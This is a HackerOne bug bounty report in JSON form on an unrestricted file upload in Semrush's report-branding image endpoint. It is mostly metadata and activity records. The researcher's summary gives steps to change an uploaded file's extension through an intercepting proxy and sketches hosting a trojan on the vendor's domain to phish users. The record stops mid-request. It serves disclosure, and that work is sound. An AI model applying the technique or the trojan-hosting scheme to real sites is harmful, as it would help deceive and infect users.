{"id":748903,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDg5MDM=","url":"https://hackerone.com/reports/748903","title":"Unrestricted file upload in www.semrush.com \u003e /my_reports/api/v1/upload/image","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-11-30T23:40:40.163Z","submitted_at":"2019-11-30T23:40:40.163Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"seeu","url":"/seeu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/mHuLCzTexxnY9vvEPxRG5vpi/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15966,"url":"https://hackerone.com/semrush","handle":"semrush","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/z5zlmceddsqb6x026x37tp0ych7i/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a?response-content-disposition=inline%3B%20filename%3D%22Avatars.png%22%3B%20filename%2A%3DUTF-8%27%27Avatars.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064605Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=47582962fcdb8c5640d045644a227c4ddaead96f936158c2c25a706d2def724b","medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/z5zlmceddsqb6x026x37tp0ych7i/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22Avatars.png%22%3B%20filename%2A%3DUTF-8%27%27Avatars.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064605Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=ee1280d1b83f09f2c0d34d31431dfb61c24a3facbb872dbb43e3165e4955d9c2"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Semrush","twitter_handle":"","website":"https://www.semrush.com/","about":"Online Visibility Management Platform."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-01-10T14:14:03.761Z","bug_reporter_agreed_on_going_public_at":"2019-12-30T12:35:11.925Z","team_member_agreed_on_going_public_at":"2020-01-10T14:14:03.596Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-01-29T12:35:12.314Z","allow_singular_disclosure_after":-28923053.56020854,"singular_disclosure_allowed":true,"vote_count":123,"voters":["sectex","a_d_a_m","spam404","bibekshah","mik317","sameerphad72","prophet","dhakal_ananda","mygf","tulswani","and 113 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":12483,"asset_type":"URL","asset_identifier":"*.semrush.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6442054,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-01T14:43:15.603Z","updated_at":"2019-12-01T14:43:15.603Z","actor":{"username":"seeu","cleared":true,"url":"/seeu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/mHuLCzTexxnY9vvEPxRG5vpi/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6442091,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-01T14:55:18.735Z","updated_at":"2019-12-01T14:55:18.735Z","actor":{"username":"averonesis","cleared":true,"url":"/averonesis","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Sd5ZA3MussFy7nxECxoc1DN4/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6447403,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-02T13:05:39.224Z","updated_at":"2019-12-02T13:05:39.224Z","actor":{"username":"toniest","cleared":false,"url":"/toniest","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iKYxCwFppxdHEo3bASfsbgTE/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6482451,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-06T13:19:05.245Z","updated_at":"2019-12-06T13:19:05.245Z","actor":{"url":"/semrush","ibb":false,"profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/z5zlmceddsqb6x026x37tp0ych7i/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22Avatars.png%22%3B%20filename%2A%3DUTF-8%27%27Avatars.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064605Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=ee1280d1b83f09f2c0d34d31431dfb61c24a3facbb872dbb43e3165e4955d9c2"},"profile":{"name":"Semrush"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"semrush","collaborator":{"username":"seeu","url":"/seeu"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6482458,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-06T13:19:56.012Z","updated_at":"2019-12-06T13:19:56.012Z","actor":{"username":"toniest","cleared":false,"url":"/toniest","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iKYxCwFppxdHEo3bASfsbgTE/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6484713,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-06T15:42:50.503Z","updated_at":"2019-12-06T15:42:50.503Z","actor":{"username":"seeu","cleared":true,"url":"/seeu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/mHuLCzTexxnY9vvEPxRG5vpi/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6654283,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-30T07:13:39.561Z","updated_at":"2019-12-30T07:13:39.561Z","actor":{"username":"toniest","cleared":false,"url":"/toniest","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iKYxCwFppxdHEo3bASfsbgTE/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"seeu","url":"/seeu"},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6659070,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-30T12:35:11.950Z","updated_at":"2019-12-30T12:35:11.950Z","first_to_agree":true,"actor":{"username":"seeu","cleared":true,"url":"/seeu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/mHuLCzTexxnY9vvEPxRG5vpi/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6736374,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-10T14:14:03.634Z","updated_at":"2020-01-10T14:14:03.634Z","actor":{"username":"wshuwll","cleared":false,"url":"/wshuwll","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/q6ert22pt3zbo28i0faffzkdm4eu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22Screenshot%202020-12-01%20at%2016.15.43.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot%25202020-12-01%2520at%252016.15.43.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064605Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=0eb512630de5c34171779526458ff13e850d544b340522f67f3c3cf082ade7c3"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6736375,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-10T14:14:03.789Z","updated_at":"2020-01-10T14:14:03.789Z","actor":{"username":"wshuwll","cleared":false,"url":"/wshuwll","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/q6ert22pt3zbo28i0faffzkdm4eu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22Screenshot%202020-12-01%20at%2016.15.43.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot%25202020-12-01%2520at%252016.15.43.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064605Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=0eb512630de5c34171779526458ff13e850d544b340522f67f3c3cf082ade7c3"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6748397,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-12T15:27:25.302Z","updated_at":"2020-01-12T15:27:25.302Z","actor":{"username":"seeu","cleared":true,"url":"/seeu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/mHuLCzTexxnY9vvEPxRG5vpi/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6753440,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-13T10:15:23.813Z","updated_at":"2020-01-13T10:15:23.813Z","actor":{"username":"wshuwll","cleared":false,"url":"/wshuwll","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/q6ert22pt3zbo28i0faffzkdm4eu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22Screenshot%202020-12-01%20at%2016.15.43.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot%25202020-12-01%2520at%252016.15.43.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064605Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=0eb512630de5c34171779526458ff13e850d544b340522f67f3c3cf082ade7c3"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6753649,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-13T10:20:37.818Z","updated_at":"2020-01-13T10:20:37.818Z","actor":{"username":"seeu","cleared":true,"url":"/seeu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/mHuLCzTexxnY9vvEPxRG5vpi/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6772039,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-14T22:28:11.837Z","updated_at":"2020-01-14T22:28:11.837Z","actor":{"username":"seeu","cleared":true,"url":"/seeu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/mHuLCzTexxnY9vvEPxRG5vpi/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semrush","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":19869,"category":"team","content":"@zcashi found vulnerability in My Reports Tool.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003e\u003ca href=\"/zcashi\"\u003e@zcashi\u003c/a\u003e found vulnerability in My Reports Tool.\u003c/p\u003e\n"},{"id":19677,"category":"researcher","content":"In many sections of the platform is presents the possibility to print a PDF of the SEO results you have obtained, this was discovered first at \"Keyboard analytics\" \u003e \"Overview\". The report generator gives you the possibility to brand your report with your logo.\n\nI've intercepted the request of the logo upload thanks to Burp Suite. The content of the file was encoded in base64 and I've successfully managed to modify the extension of the file by simply renaming it without any kind of restriction.\n\nSo, the ***steps to reproduce*** this vulnerability were:\n 1. Click on the PDF button to generate your report;\n 2. Click on \"Brand this report\" and upload your logo;\n 3. Intercept the request, modify the content if you have to and modify the extension.\n\nThe same file will be also hosted on www.semrush.com, es.semrush.com, de.semrush.com, fr.semrush.com, it.semrush.com, pt.semrush.com, ru.semrush.com, zh.semrush.com, ja.semrush.com at the same time by a single upload.\n\n(un)fortunately, when you try to reach the file you only could download it. For this reason, the impact of the vulnerability was limited.\n\nAn example scenario to clarify the impact was this: if I have bad intentions, I can upload an apk or exe with a trojan and storing it on your website. I can then send the link to the file to every SEMrush user saying that it's a new special update and since the file is on www.semrush.com the file is trustworthy.\n\n####Request:\n```\nPOST /my_reports/api/v1/upload/image HTTP/1.1\nHost: www.semrush.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) 